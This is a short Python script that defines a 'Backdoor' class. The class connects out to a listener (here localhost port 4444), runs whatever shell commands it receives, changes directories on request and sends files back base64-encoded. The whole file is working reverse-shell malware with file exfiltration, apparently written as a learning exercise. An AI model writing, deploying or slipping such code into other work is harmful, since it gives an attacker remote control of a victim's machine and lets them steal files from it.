#!/usr/bin/python3
import json_communicate as comms
import socket
import subprocess
import json
import os
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        cmdstr = " ".join(command)
        print("[+] received command " + cmdstr)
        return subprocess.getoutput(cmdstr)

    def cwd_to(self, path):
        if path and os.path.exists(path):
            os.chdir(path)
        return subprocess.getoutput("pwd")

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read()).decode('UTF-8')

    def run(self):
        while True:
            command = comms.receive(self.connection)
            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.cwd_to(command[1])
            elif command[0] == "download":
                command_result = self.read_file(command[1])
            else:
                command_result = self.execute_system_command(command)
            print(command_result)
            comms.send(self.connection, command_result)
        self.connection.close()


my_backdoor = Backdoor("localhost", 4444)
my_backdoor.run()